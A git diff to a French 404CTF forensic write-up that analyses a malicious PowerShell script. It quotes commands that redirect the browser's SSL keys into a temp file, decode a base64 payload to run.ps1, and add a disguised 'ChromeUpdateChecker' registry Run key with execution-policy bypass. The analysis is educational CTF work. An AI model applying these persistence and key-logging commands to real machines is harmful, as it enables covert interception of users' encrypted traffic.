@@ -6,6 +6,7 @@ date: 2024-04-04T05:00:00Z
 image: /images/404CTF_logo.png
 categories:
   - 404CTF
+  - Forensic
   - moyen
 author: Professeur_Jack
 tags:
@@ -88,7 +89,7 @@ foreach($bbbbbbbbbbbbinGet-ChildItem-Recurse-PathC:\Users-ErrorActionSilentlyCon
 >Pour résumer, le script a substitué le raccourci du navigateur pour lui passer des options qui enregistreront les clés SSL dans un fichier TEMP\defender-res.txt ! 
 
 Si un attaquant mettait la main sur ces clés, il pourrait déchiffrer à la volée le traffic http de la machine, cadenas vert ou non.
-Il y a fort à parier, que c'est la nature du contenu des requêtes **POST**, mais leur contenu est chiffré. 
+Il y a fort à parier que c'est la nature du contenu des requêtes **POST**, mais leur contenu est chiffré. 
 On doit poursuivre l'analyse du script pour trouver de nouveaux éléments.
 
 La plus grosse partie du script, le contenu de la variable `$cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc` semble contenir une grosse clé de chiffrement sous forme de tableau de nombres.
@@ -110,7 +111,8 @@ powershell -ep Bypass -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0AVw
 Vient ensuite une nouvelle commande encodée, qui se traduit par `Start-Process -WindowStyle Maximized https://hello.smyler.net`.
 C'est une petite blague des organisateurs, on peut passer à la suite =)
 
-1. `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc))>$env:TEMP\run.ps1`: 
+1. `[System.Text.Encoding]::UTF8.GetString([System.Convert]
+::FromBase64String($cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc))>$env:TEMP\run.ps1`: 
    Ceci semble déchiffrer le contenu de la variable `cccc`, puis redirige la sortie dans un fichier `run.ps1` dans le répertoire TEMP de l'utilisateur.
 
 2. `New-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run -Name ChromeUpdateChecker -Value "powershell -ep Bypass -File $env:TEMP\run.ps1" -PropertyType String -Force`: 
